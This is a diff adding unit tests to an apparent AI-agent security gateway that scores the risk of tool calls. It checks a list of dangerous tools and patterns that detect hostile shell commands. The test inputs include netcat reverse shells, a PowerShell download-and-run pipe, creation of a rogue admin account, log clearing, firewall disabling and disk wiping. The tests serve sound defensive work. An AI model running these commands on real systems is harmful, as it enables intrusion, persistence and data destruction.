@@ -872,3 +872,295 @@ class TestL2AsyncContextPath:
         assert tier == DecisionTier.L2
         assert snapshot.classified_by == "L2"
         assert decision.decision is not None
+
+
+# ===========================================================================
+# D3 Expanded Pattern Tests (Task 4)
+# ===========================================================================
+
+class TestDangerousToolsExpanded:
+    """DANGEROUS_TOOLS expanded to 50+ cross-platform entries."""
+
+    def test_count_at_least_50(self):
+        from clawsentry.gateway.risk_snapshot import DANGEROUS_TOOLS
+        assert len(DANGEROUS_TOOLS) >= 50, (
+            f"Expected >= 50 entries in DANGEROUS_TOOLS, got {len(DANGEROUS_TOOLS)}"
+        )
+
+    def test_shells_present(self):
+        from clawsentry.gateway.risk_snapshot import DANGEROUS_TOOLS
+        for tool in ("bash", "sh", "zsh", "ksh", "dash", "powershell", "cmd"):
+            assert tool in DANGEROUS_TOOLS, f"{tool!r} missing from DANGEROUS_TOOLS"
+
+    def test_privilege_tools_present(self):
+        from clawsentry.gateway.risk_snapshot import DANGEROUS_TOOLS
+        for tool in ("sudo", "su", "pkexec", "doas", "runas"):
+            assert tool in DANGEROUS_TOOLS, f"{tool!r} missing from DANGEROUS_TOOLS"
+
+    def test_macos_tools_present(self):
+        from clawsentry.gateway.risk_snapshot import DANGEROUS_TOOLS
+        for tool in ("launchctl", "diskutil", "pmset", "dscl", "security", "codesign"):
+            assert tool in DANGEROUS_TOOLS, f"{tool!r} missing from DANGEROUS_TOOLS"
+
+    def test_windows_tools_present(self):
+        from clawsentry.gateway.risk_snapshot import DANGEROUS_TOOLS
+        for tool in ("wmic", "reg", "schtasks", "netsh", "icacls", "diskpart", "msiexec", "rundll32"):
+            assert tool in DANGEROUS_TOOLS, f"{tool!r} missing from DANGEROUS_TOOLS"
+
+    def test_network_tools_present(self):
+        from clawsentry.gateway.risk_snapshot import DANGEROUS_TOOLS
+        for tool in ("nc", "ncat", "netcat", "socat", "telnet", "ssh", "ftp"):
+            assert tool in DANGEROUS_TOOLS, f"{tool!r} missing from DANGEROUS_TOOLS"
+
+    def test_persistence_tools_present(self):
+        from clawsentry.gateway.risk_snapshot import DANGEROUS_TOOLS
+        for tool in ("cron", "crontab", "systemctl"):
+            assert tool in DANGEROUS_TOOLS, f"{tool!r} missing from DANGEROUS_TOOLS"
+
+
+class TestD3NewHighDangerPatterns:
+    """New _D3_HIGH_DANGER_PATTERNS added in Task 4 produce d3=3."""
+
+    # Windows destructive
+    def test_rmdir_s_q(self):
+        evt = _evt(tool_name="bash", payload={"command": "rmdir /s /q C:\\Users\\victim"})
+        assert _score_d3(evt) == 3
+
+    def test_remove_item_recurse_force(self):
+        evt = _evt(tool_name="bash", payload={"command": "Remove-Item C:\\temp -Recurse -Force"})
+        assert _score_d3(evt) == 3
+
+    def test_del_sq(self):
+        evt = _evt(tool_name="bash", payload={"command": "del /s /q C:\\secret"})
+        assert _score_d3(evt) == 3
+
+    # Privilege escalation
+    def test_set_execution_policy_unrestricted(self):
+        evt = _evt(tool_name="bash", payload={"command": "Set-ExecutionPolicy Unrestricted"})
+        assert _score_d3(evt) == 3
+
+    def test_set_execution_policy_bypass(self):
+        evt = _evt(tool_name="bash", payload={"command": "Set-ExecutionPolicy Bypass -Scope CurrentUser"})
+        assert _score_d3(evt) == 3
+
+    def test_net_user_add(self):
+        evt = _evt(tool_name="bash", payload={"command": "net user hacker pass123 /add"})
+        assert _score_d3(evt) == 3
+
+    def test_net_localgroup_add(self):
+        evt = _evt(tool_name="bash", payload={"command": "net localgroup Administrators hacker /add"})
+        assert _score_d3(evt) == 3
+
+    # macOS disk destruction
+    def test_diskutil_secure_erase(self):
+        evt = _evt(tool_name="bash", payload={"command": "diskutil secureErase 0 /dev/disk2"})
+        assert _score_d3(evt) == 3
+
+    def test_diskutil_erase_disk(self):
+        evt = _evt(tool_name="bash", payload={"command": "diskutil eraseDisk APFS MyDisk /dev/disk3"})
+        assert _score_d3(evt) == 3
+
+    # Firewall tampering — flush only
+    def test_iptables_flush(self):
+        evt = _evt(tool_name="bash", payload={"command": "iptables -F"})
+        assert _score_d3(evt) == 3
+
+    def test_iptables_delete_chain(self):
+        evt = _evt(tool_name="bash", payload={"command": "iptables -X MYCHAIN"})
+        assert _score_d3(evt) == 3
+
+    def test_iptables_safe_add_not_matched(self):
+        """iptables -A (rule addition) should NOT match the flush pattern."""
+        evt = _evt(tool_name="bash", payload={"command": "iptables -A INPUT -p tcp --dport 80 -j ACCEPT"})
+        # Should not return 3 due to iptables flush pattern specifically
+        # (may still be 2 from unknown command fallback, but NOT due to the flush pattern)
+        # We only assert it doesn't trigger the flush pattern by checking no HIGH_DANGER match
+        from clawsentry.gateway.risk_snapshot import _has_dangerous_command_pattern
+        assert not _has_dangerous_command_pattern("iptables -A INPUT -p tcp --dport 80 -j ACCEPT")
+
+    def test_ufw_disable(self):
+        evt = _evt(tool_name="bash", payload={"command": "ufw disable"})
+        assert _score_d3(evt) == 3
+
+    def test_ufw_reset(self):
+        evt = _evt(tool_name="bash", payload={"command": "ufw reset"})
+        assert _score_d3(evt) == 3
+
+    def test_netsh_firewall_off(self):
+        evt = _evt(tool_name="bash", payload={"command": "netsh advfirewall set allprofiles state off"})
+        assert _score_d3(evt) == 3
+
+    # Log clearing
+    def test_wevtutil_clear_security(self):
+        evt = _evt(tool_name="bash", payload={"command": "wevtutil cl Security"})
+        assert _score_d3(evt) == 3
+
+    def test_wevtutil_clear_system(self):
+        evt = _evt(tool_name="bash", payload={"command": "wevtutil cl System"})
+        assert _score_d3(evt) == 3
+
+    def test_rm_f_var_log(self):
+        # R-12 fix: non-recursive rm -f on single log file is d3=2 (potential destructive),
+        # not d3=3 (high danger). Only rm -rf /var/log/ is catastrophic.
+        evt = _evt(tool_name="bash", payload={"command": "rm -f /var/log/auth.log"})
+        assert _score_d3(evt) == 2
+
+    # Reverse shell
+    def test_nc_reverse_shell(self):
+        evt = _evt(tool_name="bash", payload={"command": "nc 10.0.0.1 4444 -e /bin/bash"})
+        assert _score_d3(evt) == 3
+
+    def test_netcat_reverse_shell_cmd(self):
+        evt = _evt(tool_name="bash", payload={"command": "netcat 192.168.1.100 9001 -e cmd"})
+        assert _score_d3(evt) == 3
+
+    def test_iex_pipe(self):
+        evt = _evt(tool_name="bash", payload={"command": "something | IEX(New-Object Net.WebClient)"})
+        assert _score_d3(evt) == 3
+
+    # Disk destruction
+    def test_shred_unlink(self):
+        evt = _evt(tool_name="bash", payload={"command": "shred -zu /etc/passwd"})
+        assert _score_d3(evt) == 3
+
+    def test_cipher_wipe(self):
+        evt = _evt(tool_name="bash", payload={"command": "cipher /w:C:\\SensitiveData"})
+        assert _score_d3(evt) == 3
+
+
+class TestD3PotentialDestructivePatterns:
+    """_D3_POTENTIAL_DESTRUCTIVE_PATTERNS yield d3=2."""
+
+    def test_launchctl_unload_library(self):
+        evt = _evt(tool_name="bash", payload={"command": "launchctl unload /Library/LaunchDaemons/com.example.plist"})
+        assert _score_d3(evt) == 2
+
+    def test_launchctl_disable_system(self):
+        evt = _evt(tool_name="bash", payload={"command": "launchctl disable /System/Library/LaunchDaemons/ssh.plist"})
+        assert _score_d3(evt) == 2
+
+    def test_icacls_grant(self):
+        evt = _evt(tool_name="bash", payload={"command": "icacls C:\\Windows /grant Everyone:F"})
+        assert _score_d3(evt) == 2
+
+    def test_icacls_deny(self):
+        evt = _evt(tool_name="bash", payload={"command": "icacls C:\\secret.txt /deny Domain\\Users:(R)"})
+        assert _score_d3(evt) == 2
+
+    def test_launchctl_load_not_matched(self):
+        """launchctl load (not unload/disable) should not trigger d3=2 via this pattern."""
+        from clawsentry.gateway.risk_snapshot import _D3_POTENTIAL_DESTRUCTIVE_PATTERNS
+        cmd = "launchctl load /Library/LaunchDaemons/com.example.plist"
+        for pat in _D3_POTENTIAL_DESTRUCTIVE_PATTERNS:
+            assert not pat.search(cmd), f"Pattern {pat.pattern!r} unexpectedly matched launchctl load"
+
+
+# ===========================================================================
+# R-10: DANGEROUS_TOOLS sync to D1 scoring
+# ===========================================================================
+
+class TestReviewD1Sync:
+    """R-10: Verify expanded DANGEROUS_TOOLS score D1=3."""
+
+    def test_netcat_scores_d1_3(self):
+        from clawsentry.gateway.risk_snapshot import _score_d1
+        evt = _evt(tool_name="netcat")
+        assert _score_d1(evt) == 3
+
+    def test_powershell_scores_d1_3(self):
+        from clawsentry.gateway.risk_snapshot import _score_d1
+        evt = _evt(tool_name="powershell")
+        assert _score_d1(evt) == 3
+
+    def test_wmic_scores_d1_3(self):
+        from clawsentry.gateway.risk_snapshot import _score_d1
+        evt = _evt(tool_name="wmic")
+        assert _score_d1(evt) == 3
+
+    def test_socat_scores_d1_3(self):
+        from clawsentry.gateway.risk_snapshot import _score_d1
+        evt = _evt(tool_name="socat")
+        assert _score_d1(evt) == 3
+
+    def test_crontab_scores_d1_3(self):
+        from clawsentry.gateway.risk_snapshot import _score_d1
+        evt = _evt(tool_name="crontab")
+        assert _score_d1(evt) == 3
+
+    def test_systemctl_scores_d1_3(self):
+        from clawsentry.gateway.risk_snapshot import _score_d1
+        evt = _evt(tool_name="systemctl")
+        assert _score_d1(evt) == 3
+
+    def test_schtasks_scores_d1_3(self):
+        from clawsentry.gateway.risk_snapshot import _score_d1
+        evt = _evt(tool_name="schtasks")
+        assert _score_d1(evt) == 3
+
+    def test_bash_still_analyzed_not_just_d1_3(self):
+        """bash is in DANGEROUS_TOOLS but should still go through command analysis."""
+        from clawsentry.gateway.risk_snapshot import _score_d1
+        # bash with safe command should be D1=2 (not blindly D1=3)
+        evt = _evt(tool_name="bash", payload={"command": "ls -la"})
+        assert _score_d1(evt) == 2
+
+    def test_shell_still_analyzed_not_just_d1_3(self):
+        """shell is in DANGEROUS_TOOLS but should still go through command analysis."""
+        from clawsentry.gateway.risk_snapshot import _score_d1
+        evt = _evt(tool_name="shell", payload={"command": "echo hello"})
+        assert _score_d1(evt) == 2
+
+
+# ===========================================================================
+# R-11/R-12/R-13: D3 pattern false positive fixes
+# ===========================================================================
+
+class TestReviewD3FalsePositives:
+    """R-11/R-12/R-13: Tightened D3 patterns reduce false positives."""
+
+    # R-11: dd pattern — require device target
+    def test_dd_date_format_no_fp(self):
+        from clawsentry.gateway.risk_snapshot import _has_dangerous_command_pattern
+        assert not _has_dangerous_command_pattern("echo dd-mm-yyyy")
+
+    def test_dd_variable_no_fp(self):
+        from clawsentry.gateway.risk_snapshot import _has_dangerous_command_pattern
+        assert not _has_dangerous_command_pattern("DD=data; echo $DD")
+
+    def test_dd_with_device_target_detects(self):
+        from clawsentry.gateway.risk_snapshot import _has_dangerous_command_pattern
+        assert _has_dangerous_command_pattern("dd if=/dev/zero of=/dev/sda bs=1M")
+
+    def test_dd_with_dev_null_output(self):
+        from clawsentry.gateway.risk_snapshot import _has_dangerous_command_pattern
+        assert _has_dangerous_command_pattern("dd if=backup.img of=/dev/sdb")
+
+    # R-12: rm -f /var/log/ — only match recursive
+    def test_rm_f_log_rotation_no_fp(self):
+        from clawsentry.gateway.risk_snapshot import _has_dangerous_command_pattern
+        assert not _has_dangerous_command_pattern("rm -f /var/log/nginx/access.log.1")
+
+    def test_rm_f_single_log_no_fp(self):
+        from clawsentry.gateway.risk_snapshot import _has_dangerous_command_pattern
+        assert not _has_dangerous_command_pattern("rm -f /var/log/auth.log")
+
+    def test_rm_rf_var_log_still_detects(self):
+        from clawsentry.gateway.risk_snapshot import _has_dangerous_command_pattern
+        assert _has_dangerous_command_pattern("rm -rf /var/log/")
+
+    def test_rm_rf_var_log_alternate_flag_order(self):
+        from clawsentry.gateway.risk_snapshot import _has_dangerous_command_pattern
+        assert _has_dangerous_command_pattern("rm -fr /var/log/")
+
+    # R-13: iptables -Z (counter reset) is not dangerous
+    def test_iptables_zero_counters_no_d3_3(self):
+        from clawsentry.gateway.risk_snapshot import _has_dangerous_command_pattern
+        assert not _has_dangerous_command_pattern("iptables -Z")
+
+    def test_iptables_flush_still_detects(self):
+        from clawsentry.gateway.risk_snapshot import _has_dangerous_command_pattern
+        assert _has_dangerous_command_pattern("iptables -F")
+
+    def test_iptables_delete_chains_still_detects(self):
+        from clawsentry.gateway.risk_snapshot import _has_dangerous_command_pattern
+        assert _has_dangerous_command_pattern("iptables -X")
